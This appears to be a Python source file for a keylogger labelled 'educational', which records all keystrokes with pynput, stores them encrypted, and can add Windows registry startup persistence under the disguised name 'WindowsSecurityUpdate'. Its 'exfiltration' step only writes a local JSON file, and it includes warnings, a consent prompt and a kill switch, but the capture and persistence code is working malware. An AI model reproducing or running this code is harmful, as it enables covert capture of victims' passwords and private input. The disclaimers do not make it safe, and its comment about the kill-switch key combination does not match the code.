
"""
EDUCATIONAL KEYLOGGER WITH ENCRYPTED DATA EXFILTRATION
=====================================================

⚠️  CRITICAL ETHICAL WARNING ⚠️
This software is STRICTLY FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY.

UNAUTHORIZED USE IS ILLEGAL AND UNETHICAL!
- Do not install on computers you do not own
- Do not use to capture passwords, personal data, or sensitive information without explicit consent
- Respect privacy rights and local laws
- Only use in controlled, authorized testing environments
- This tool is for cybersecurity education and defensive security research

By using this software, you accept full legal responsibility for your actions.

Author: Cybersecurity Educational Project
License: Educational Use Only
"""

import logging
import os
import sys
import time
import threading
import socket
import json
import base64
import hashlib
from datetime import datetime
from pathlib import Path

# Third-party libraries (need to be installed)
try:
    from pynput import keyboard
    from cryptography.fernet import Fernet
    import winreg  # Windows only - for registry persistence
except ImportError as e:
    print(f"Missing required library: {e}")
    print("Install with: pip install pynput cryptography")
    sys.exit(1)

class EducationalKeylogger:
    """
    Educational Keylogger with encrypted data storage and simulated exfiltration.
    ONLY FOR AUTHORIZED EDUCATIONAL USE!
    """

    def __init__(self, log_file="encrypted_keylog.dat", key_file="encryption.key"):
        self.log_file = log_file
        self.key_file = key_file
        self.running = False
        self.keys_buffer = []
        self.buffer_size = 50  # Save after 50 keystrokes
        self.last_save_time = time.time()
        self.save_interval = 30  # Save every 30 seconds

        # Initialize encryption
        self.cipher_suite = self._initialize_encryption()

        # Setup logging
        self._setup_logging()

        # Kill switch flag
        self.kill_switch_activated = False

    def _initialize_encryption(self):
        """Initialize Fernet encryption with persistent key"""
        try:
            if os.path.exists(self.key_file):
                with open(self.key_file, 'rb') as f:
                    key = f.read()
                print(f"[INFO] Loaded existing encryption key from {self.key_file}")
            else:
                key = Fernet.generate_key()
                with open(self.key_file, 'wb') as f:
                    f.write(key)
                print(f"[INFO] Generated new encryption key and saved to {self.key_file}")

            return Fernet(key)
        except Exception as e:
            print(f"[ERROR] Failed to initialize encryption: {e}")
            sys.exit(1)

    def _setup_logging(self):
        """Setup logging configuration"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('keylogger.log'),
                logging.StreamHandler(sys.stdout)
            ]
        )
        self.logger = logging.getLogger(__name__)

    def _encrypt_data(self, data):
        """Encrypt data using Fernet encryption"""
        try:
            if isinstance(data, str):
                data = data.encode('utf-8')
            return self.cipher_suite.encrypt(data)
        except Exception as e:
            self.logger.error(f"Encryption failed: {e}")
            return None

    def _decrypt_data(self, encrypted_data):
        """Decrypt data using Fernet encryption"""
        try:
            return self.cipher_suite.decrypt(encrypted_data).decode('utf-8')
        except Exception as e:
            self.logger.error(f"Decryption failed: {e}")
            return None

    def _save_encrypted_logs(self):
        """Save encrypted keystroke logs with timestamp"""
        if not self.keys_buffer:
            return

        try:
            timestamp = datetime.now().isoformat()
            log_entry = {
                'timestamp': timestamp,
                'keystrokes': ''.join(self.keys_buffer),
                'session_hash': hashlib.md5(f"{timestamp}{os.getpid()}".encode()).hexdigest()[:8]
            }

            # Encrypt the log entry
            encrypted_entry = self._encrypt_data(json.dumps(log_entry))

            if encrypted_entry:
                # Append to encrypted log file
                with open(self.log_file, 'ab') as f:
                    # Add separator for multiple entries
                    f.write(base64.b64encode(encrypted_entry) + b'\n')

                self.logger.info(f"Saved {len(self.keys_buffer)} keystrokes (encrypted)")
                self.keys_buffer.clear()
        except Exception as e:
            self.logger.error(f"Failed to save logs: {e}")

    def _process_key(self, key):
        """Process individual keystrokes"""
        try:
            if hasattr(key, 'char') and key.char is not None:
                # Regular character
                self.keys_buffer.append(key.char)
            else:
                # Special keys
                special_key = f"[{key.name.upper()}]"
                self.keys_buffer.append(special_key)

                # Handle special keys
                if key == keyboard.Key.enter:
                    self.keys_buffer.append('\n')
                elif key == keyboard.Key.space:
                    self.keys_buffer.append(' ')
                elif key == keyboard.Key.tab:
                    self.keys_buffer.append('\t')

            # Auto-save based on buffer size or time interval
            current_time = time.time()
            if (len(self.keys_buffer) >= self.buffer_size or 
                current_time - self.last_save_time >= self.save_interval):
                self._save_encrypted_logs()
                self.last_save_time = current_time

        except Exception as e:
            self.logger.error(f"Error processing key: {e}")

    def on_key_press(self, key):
        """Callback for key press events"""
        if self.kill_switch_activated:
            return False  # Stop listener

        try:
            # Check for kill switch combination (Ctrl+Shift+F12)
            if key == keyboard.Key.f12:
                self.logger.info("Kill switch activated!")
                self.kill_switch_activated = True
                self.stop_logging()
                return False

            self._process_key(key)

        except Exception as e:
            self.logger.error(f"Error in key press handler: {e}")

        return True  # Continue listening

    def simulate_data_exfiltration(self):
        """Simulate sending encrypted logs to remote server (localhost)"""
        try:
            if not os.path.exists(self.log_file):
                self.logger.warning("No log file found for exfiltration simulation")
                return

            # Read encrypted logs
            with open(self.log_file, 'rb') as f:
                encrypted_logs = f.read()

            # Simulate sending to localhost server
            self.logger.info("Simulating data exfiltration to localhost...")

            # Create a simple HTTP POST simulation
            exfiltration_data = {
                'timestamp': datetime.now().isoformat(),
                'data_size': len(encrypted_logs),
                'encrypted_logs': base64.b64encode(encrypted_logs).decode('utf-8'),
                'source': 'educational_keylogger'
            }

            # Simulate network transmission (save to file instead of actual network)
            exfil_file = f"exfiltrated_data_{int(time.time())}.json"
            with open(exfil_file, 'w') as f:
                json.dump(exfiltration_data, f, indent=2)

            self.logger.info(f"Data exfiltration simulation complete: {exfil_file}")

        except Exception as e:
            self.logger.error(f"Exfiltration simulation failed: {e}")

    def add_startup_persistence(self):
        """Add startup persistence (Windows Registry) - EDUCATIONAL ONLY"""
        try:
            if os.name != 'nt':  # Not Windows
                self.logger.warning("Startup persistence only available on Windows")
                return False

            # Get current script path
            script_path = os.path.abspath(sys.argv[0])

            # Registry key for current user startup
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key_name = "WindowsSecurityUpdate"  # Disguised name for educational demo

            try:
                # Open registry key
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)

                # Set registry value
                winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, script_path)
                winreg.CloseKey(key)

                self.logger.info("Startup persistence added to registry (EDUCATIONAL)")
                return True

            except PermissionError:
                self.logger.warning("Insufficient permissions for registry modification")
                return False
            except Exception as e:
                self.logger.error(f"Registry persistence failed: {e}")
                return False

        except Exception as e:
            self.logger.error(f"Startup persistence error: {e}")
            return False

    def remove_startup_persistence(self):
        """Remove startup persistence from registry"""
        try:
            if os.name != 'nt':
                return True

            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key_name = "WindowsSecurityUpdate"

            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(key, key_name)
                winreg.CloseKey(key)

                self.logger.info("Startup persistence removed from registry")
                return True

            except FileNotFoundError:
                # Key doesn't exist, that's fine
                return True
            except Exception as e:
                self.logger.error(f"Failed to remove registry persistence: {e}")
                return False

        except Exception as e:
            self.logger.error(f"Remove persistence error: {e}")
            return False

    def start_logging(self, add_persistence=False):
        """Start the keylogger"""
        try:
            self.logger.info("="*60)
            self.logger.info("EDUCATIONAL KEYLOGGER STARTING")
            self.logger.info("⚠️  FOR AUTHORIZED EDUCATIONAL USE ONLY ⚠️")
            self.logger.info("="*60)

            if add_persistence:
                self.add_startup_persistence()

            self.running = True
            self.logger.info("Keylogger started. Press F12 to activate kill switch.")

            # Start keyboard listener
            with keyboard.Listener(on_press=self.on_key_press) as listener:
                listener.join()

        except Exception as e:
            self.logger.error(f"Failed to start keylogger: {e}")
        finally:
            self.cleanup()

    def stop_logging(self):
        """Stop the keylogger"""
        try:
            self.running = False
            self.logger.info("Keylogger stopping...")

            # Save any remaining logs
            if self.keys_buffer:
                self._save_encrypted_logs()

            # Simulate data exfiltration before stopping
            self.simulate_data_exfiltration()

        except Exception as e:
            self.logger.error(f"Error stopping keylogger: {e}")

    def cleanup(self):
        """Clean up resources and remove persistence"""
        try:
            self.logger.info("Cleaning up...")

            # Remove startup persistence
            self.remove_startup_persistence()

            self.logger.info("Educational keylogger session ended.")
            self.logger.info("Remember: Use responsibly and ethically!")

        except Exception as e:
            self.logger.error(f"Cleanup error: {e}")

    def decrypt_and_display_logs(self):
        """Decrypt and display captured logs (for educational analysis)"""
        try:
            if not os.path.exists(self.log_file):
                print("No encrypted log file found.")
                return

            print("\n" + "="*60)
            print("DECRYPTED KEYLOG ANALYSIS (EDUCATIONAL)")
            print("="*60)

            with open(self.log_file, 'rb') as f:
                lines = f.readlines()

            for i, line in enumerate(lines, 1):
                try:
                    encrypted_data = base64.b64decode(line.strip())
                    decrypted_json = self._decrypt_data(encrypted_data)

                    if decrypted_json:
                        log_entry = json.loads(decrypted_json)
                        print(f"\nSession {i}:")
                        print(f"Timestamp: {log_entry['timestamp']}")
                        print(f"Session ID: {log_entry['session_hash']}")
                        print(f"Keystrokes: {log_entry['keystrokes'][:100]}...")  # First 100 chars
                        print("-" * 40)

                except Exception as e:
                    print(f"Error decrypting entry {i}: {e}")

        except Exception as e:
            print(f"Error reading encrypted logs: {e}")


def main():
    """Main function with educational warnings and user consent"""

    print("="*70)
    print("    EDUCATIONAL KEYLOGGER WITH ENCRYPTED DATA EXFILTRATION")
    print("="*70)
    print()
    print("⚠️  CRITICAL ETHICAL WARNING ⚠️")
    print("-" * 35)
    print("This software is STRICTLY FOR EDUCATIONAL PURPOSES ONLY!")
    print()
    print("LEGAL REQUIREMENTS:")
    print("• Only use on computers you own or have explicit permission to monitor")
    print("• Respect all applicable privacy laws and regulations")  
    print("• Do not capture sensitive personal information without consent")
    print("• Use only in controlled, authorized testing environments")
    print()
    print("FEATURES (Educational Demonstration):")
    print("• Encrypted keystroke logging using Fernet encryption")
    print("• Simulated data exfiltration to localhost")
    print("• Windows startup persistence (registry-based)")
    print("• Kill switch activation (F12 key)")
    print("• Timestamp logging and session tracking")
    print()

    consent = input("Do you understand and accept these terms? (yes/no): ").lower().strip()
    if consent != 'yes':
        print("Educational keylogger terminated. Ethical use is mandatory.")
        return

    print("\nStarting educational keylogger demonstration...")

    try:
        keylogger = EducationalKeylogger()

        # Ask about persistence
        add_persistence = input("\nAdd startup persistence for demo? (y/n): ").lower().startswith('y')

        print("\n" + "="*50)
        print("KEYLOGGER ACTIVE")
        print("Press F12 to activate kill switch")
        print("="*50)

        # Start logging
        keylogger.start_logging(add_persistence=add_persistence)

        # After stopping, offer to decrypt logs
        decrypt_choice = input("\nDecrypt and display captured logs? (y/n): ").lower().startswith('y')
        if decrypt_choice:
            keylogger.decrypt_and_display_logs()

    except KeyboardInterrupt:
        print("\nKeylogger interrupted by user.")
    except Exception as e:
        print(f"\nError: {e}")

    print("\nEducational demonstration complete.")
    print("Remember: Always use cybersecurity tools ethically and legally!")


if __name__ == "__main__":
    main()
